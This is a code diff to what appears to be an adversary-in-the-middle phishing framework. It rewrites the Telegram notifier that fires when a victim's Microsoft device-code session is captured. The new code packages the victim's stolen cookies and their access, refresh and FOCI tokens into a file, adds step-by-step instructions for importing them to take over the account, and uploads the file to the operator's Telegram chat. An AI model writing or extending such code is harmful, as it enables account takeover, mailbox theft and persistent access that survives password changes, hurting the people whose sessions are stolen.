@@ -1081,69 +1081,151 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 			provider = data.Phishlet
 		}
 
-		text = "🎯 DEVICE CODE TOKENS CAPTURED!\n"
-		text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-		text += fmt.Sprintf("👤 User: %s\n", userName)
-		text += fmt.Sprintf("📧 Email: %s\n", userEmail)
-		text += fmt.Sprintf("🔗 Provider: %s\n", provider)
-		text += fmt.Sprintf("📱 Client: %s\n", client)
-		text += fmt.Sprintf("🌐 IP: %s\n", data.Origin)
-		text += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
-		text += fmt.Sprintf("🏢 ISP: %s\n", geoInfo.ISP)
-		text += fmt.Sprintf("⏰ Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
+		// Build caption for the file
+		caption := "🎯 DEVICE CODE CAPTURED!\n"
+		caption += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+		caption += fmt.Sprintf("👤 User: %s\n", userName)
+		caption += fmt.Sprintf("📧 Email: %s\n", userEmail)
+		caption += fmt.Sprintf("🔗 Provider: %s\n", provider)
+		caption += fmt.Sprintf("📱 Client: %s\n", client)
+		caption += fmt.Sprintf("🌐 IP: %s\n", data.Origin)
+		caption += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
+		caption += fmt.Sprintf("🏢 ISP: %s\n", geoInfo.ISP)
+		caption += fmt.Sprintf("⏰ Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
 
-		// Send the main message first
-		payload := map[string]interface{}{
-			"chat_id": n.TelegramChatID,
-			"text":    text,
+		// Count cookies
+		cookieCount := 0
+		if dc_cookies, ok := data.Custom["dc_cookies"]; ok && dc_cookies != "" {
+			var tmpCookies []interface{}
+			json.Unmarshal([]byte(dc_cookies), &tmpCookies)
+			cookieCount = len(tmpCookies)
 		}
-		jsonData, _ := json.Marshal(payload)
-		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", n.TelegramBotToken)
-		client2 := &http.Client{Timeout: 10 * time.Second}
-		client2.Post(url, "application/json", bytes.NewBuffer(jsonData))
+		caption += fmt.Sprintf("🍪 Cookies: %d extracted\n", cookieCount)
+		caption += "✅ Import cookies with Cookie Editor extension"
 
-		// Now send individual token messages for easy copying
-		// IMPORTANT: Send ACCESS TOKEN FIRST - this is what goes in mailbox viewer
-		// Server handles refresh tokens automatically in background every 15 minutes
-		if data.Custom != nil {
-			// Access Token - send FIRST as it's what user copies
-			if accessToken := data.Custom["dc_access_token"]; accessToken != "" {
-				tokenMsg := "🔑 ACCESS TOKEN (COPY THIS)\n"
-				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: ~1 hour\n"
-				tokenMsg += "🔄 Server auto-refreshes every 15 min\n"
-				tokenMsg += "💡 Paste this in mailbox viewer\n\n"
-				tokenMsg += fmt.Sprintf("<code>%s</code>", accessToken)
+		// Build the .txt file content with cookies + tokens
+		var fileContent strings.Builder
 
-				tokenPayload := map[string]interface{}{
-					"chat_id":    n.TelegramChatID,
-					"text":       tokenMsg,
-					"parse_mode": "HTML",
-				}
-				tokenJson, _ := json.Marshal(tokenPayload)
-				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  CAPTURED SESSION - " + userEmail + "\n")
+		fileContent.WriteString("  " + time.Now().UTC().Format("2006-01-02 15:04:05 UTC") + "\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+
+		// Section 1: Cookie Editor format cookies (JSON array)
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  COOKIES - Cookie Editor Import Format\n")
+		fileContent.WriteString("  (Copy everything between START and END markers)\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		fileContent.WriteString("--- COOKIE EDITOR JSON START ---\n")
+
+		if dc_cookies, ok := data.Custom["dc_cookies"]; ok && dc_cookies != "" {
+			// The cookies are already in Cookie Editor compatible format from token_portal.go
+			// Re-format with indentation for readability
+			var rawCookies []json.RawMessage
+			if err := json.Unmarshal([]byte(dc_cookies), &rawCookies); err == nil {
+				prettyJSON, _ := json.MarshalIndent(rawCookies, "", "  ")
+				fileContent.Write(prettyJSON)
+			} else {
+				fileContent.WriteString(dc_cookies)
 			}
+		} else {
+			fileContent.WriteString("[]")
+		}
 
-			// Refresh Token - server auto-refreshes every 15 min
-			if refreshToken := data.Custom["dc_refresh_token"]; refreshToken != "" {
-				tokenMsg := "🔄 REFRESH TOKEN (Auto-Saved)\n"
-				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: 90 days (auto-renewed)\n"
-				tokenMsg += "✅ Server keeps session alive automatically\n"
-				tokenMsg += "💡 Optional: paste in mailbox viewer for extra protection\n\n"
-				tokenMsg += fmt.Sprintf("<code>%s</code>", refreshToken)
+		fileContent.WriteString("\n--- COOKIE EDITOR JSON END ---\n\n")
 
-				tokenPayload := map[string]interface{}{
-					"chat_id":    n.TelegramChatID,
-					"text":       tokenMsg,
-					"parse_mode": "HTML",
+		// Section 2: Tokens
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  ACCESS TOKEN\n")
+		fileContent.WriteString("  Valid: ~1 hour | Server auto-refreshes every 15 min\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		if at, ok := data.Custom["dc_access_token"]; ok {
+			fileContent.WriteString(at)
+		}
+		fileContent.WriteString("\n\n")
+
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  REFRESH TOKEN\n")
+		fileContent.WriteString("  Valid: 90 days | Survives password changes\n")
+		fileContent.WriteString("  Server auto-refreshes every 15 min\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		if rt, ok := data.Custom["dc_refresh_token"]; ok {
+			fileContent.WriteString(rt)
+		}
+		fileContent.WriteString("\n\n")
+
+		// Section 3: FOCI tokens if available
+		if fociJSON, ok := data.Custom["dc_foci_tokens"]; ok && fociJSON != "" {
+			fileContent.WriteString("═══════════════════════════════════════════════════\n")
+			fileContent.WriteString("  FOCI SERVICE TOKENS\n")
+			fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+			var fociTokens map[string]string
+			if err := json.Unmarshal([]byte(fociJSON), &fociTokens); err == nil {
+				for svcName, svcToken := range fociTokens {
+					fileContent.WriteString("--- " + svcName + " ---\n")
+					fileContent.WriteString(svcToken + "\n\n")
 				}
-				tokenJson, _ := json.Marshal(tokenPayload)
-				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
 			}
 		}
+
+		// Section 4: Instructions
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  HOW TO USE\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		fileContent.WriteString("METHOD 1 - Cookie Import (Full Browser Access):\n")
+		fileContent.WriteString("1. Install 'Cookie Editor' extension in Chrome/Edge\n")
+		fileContent.WriteString("2. Go to https://login.microsoftonline.com\n")
+		fileContent.WriteString("3. Click Cookie Editor icon → Import\n")
+		fileContent.WriteString("4. Copy ONLY the JSON between START/END markers above\n")
+		fileContent.WriteString("5. Paste and click Import\n")
+		fileContent.WriteString("6. Refresh the page → signed in as " + userEmail + "\n")
+		fileContent.WriteString("7. Navigate to outlook.office365.com, onedrive.live.com, etc.\n\n")
+		fileContent.WriteString("METHOD 2 - Mailbox Viewer:\n")
+		fileContent.WriteString("1. Open mailbox.html in browser\n")
+		fileContent.WriteString("2. Paste the ACCESS TOKEN above\n")
+		fileContent.WriteString("3. Full mailbox access immediately\n\n")
+		fileContent.WriteString("NOTES:\n")
+		fileContent.WriteString("• Cookies survive password changes\n")
+		fileContent.WriteString("• Server auto-refreshes tokens every 15 minutes\n")
+		fileContent.WriteString("• Refresh token valid for 90 days\n")
+
+		// Determine filename
+		usernameFile := "session"
+		if userEmail != "" {
+			usernameFile = strings.Map(func(r rune) rune {
+				if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
+					return r
+				}
+				return '_'
+			}, userEmail)
+		}
+		filename := fmt.Sprintf("%s_cookies_tokens.txt", usernameFile)
+
+		// Send as file via Telegram sendDocument
+		var body bytes.Buffer
+		writer := multipart.NewWriter(&body)
+		writer.WriteField("chat_id", n.TelegramChatID)
+		writer.WriteField("caption", caption)
+
+		part, err := writer.CreateFormFile("document", filename)
+		if err != nil {
+			return fmt.Errorf("failed to create form file: %v", err)
+		}
+		part.Write([]byte(fileContent.String()))
+		writer.Close()
+
+		docURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", n.TelegramBotToken)
+		req, _ := http.NewRequest("POST", docURL, &body)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+
+		httpClient := &http.Client{Timeout: 30 * time.Second}
+		resp, err := httpClient.Do(req)
+		if err != nil {
+			return fmt.Errorf("failed to send Telegram document: %v", err)
+		}
+		resp.Body.Close()
+
+		log.Success("[telegram] Cookies+tokens file sent for %s (%d cookies)", userEmail, cookieCount)
 		return nil
 
 	case EventDeviceCodeGenerated:
